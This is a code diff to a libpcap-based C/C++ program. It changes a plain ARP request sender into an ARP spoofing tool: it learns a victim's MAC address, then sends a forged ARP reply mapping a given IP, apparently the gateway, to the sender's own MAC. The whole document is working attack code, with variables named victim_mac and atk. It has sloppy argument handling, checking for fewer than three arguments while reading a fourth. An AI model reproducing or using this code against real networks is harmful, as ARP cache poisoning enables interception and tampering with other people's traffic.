@@ -26,11 +26,10 @@ void getMAC(char *iface, unsigned char *mac) {
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 3) {
+	if (argc < 3) {
 		usage();
 		return -1;
 	}
-
 	int fd;
     struct ifreq ifr;
     char *iface = argv[1];
@@ -69,14 +68,14 @@ int main(int argc, char* argv[]) {
 
 	EthArpPacket arp_packet;
 
-	arp_packet.eth_.dmac_ = Mac("00-00-00-00-00-00");
+	arp_packet.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
 	arp_packet.eth_.smac_ = Mac(mac);
 	arp_packet.eth_.type_ = htons(EthHdr::Arp);
 	arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
 	arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
 	arp_packet.arp_.hln_ = Mac::SIZE;
 	arp_packet.arp_.pln_ = Ip::SIZE;
-	arp_packet.arp_.op_ = htons(ArpHdr::Reply);
+	arp_packet.arp_.op_ = htons(ArpHdr::Request);
 	arp_packet.arp_.sip_ = htonl(Ip(my_ip));
 	arp_packet.arp_.smac_ = Mac(mac);
 	arp_packet.arp_.tmac_ = Mac("00-00-00-00-00-00");
@@ -86,6 +85,33 @@ int main(int argc, char* argv[]) {
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
+	char victim_mac[18];
+	while (true) {
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+		int res = pcap_next_ex(handle, &header, &packet);
+		EthArpPacket* reply = (EthArpPacket*)packet;
+		printf("Found target MAC address: %s\n", std::string(reply->arp_.smac_).c_str());
+		strcpy(victim_mac, std::string(reply->arp_.smac_).c_str());
+                break;
+		}
+	
+	arp_packet.eth_.dmac_ = Mac(victim_mac);
+        arp_packet.eth_.smac_ = Mac(mac);
+        arp_packet.eth_.type_ = htons(EthHdr::Arp);
+        arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+        arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
+        arp_packet.arp_.hln_ = Mac::SIZE;
+        arp_packet.arp_.pln_ = Ip::SIZE;
+        arp_packet.arp_.op_ = htons(ArpHdr::Reply);
+        arp_packet.arp_.sip_ = htonl(Ip(argv[3]));
+        arp_packet.arp_.smac_ = Mac(mac);
+        arp_packet.arp_.tmac_ = Mac(victim_mac);
+        arp_packet.arp_.tip_ = htonl(Ip(argv[2]));
 
+        int atk = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
+        if (atk != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(handle));
+        }	
 	pcap_close(handle);
 }
